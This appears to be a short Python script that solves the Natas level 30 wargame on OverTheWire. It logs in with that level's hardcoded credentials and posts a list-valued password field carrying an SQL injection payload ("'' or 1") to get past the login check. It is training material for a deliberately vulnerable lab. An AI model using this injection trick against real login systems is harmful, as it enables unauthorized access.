#! /usr/bin/env python

import requests
import re
import base64
import urllib
import string

usn = 'natas30'
url = 'http://%s.natas.labs.overthewire.org/' % usn
passwd = 'wie9iexae0Daihohv8vuu3cei9wahf0e'
login = (usn, passwd)
request = requests.Session()



def get_source_code():
  
  connection = request.get(url, auth = login)
 
  
  print connection.text

def solve_lab():
  connection = request.post(url, auth = login, data = {"username": "natas31", "password": ["'' or 1", 2]})

  
  #print re.findall("here is your result", connection.text)
  for x in connection.iter_lines():
    if "win!" in x:
      print x
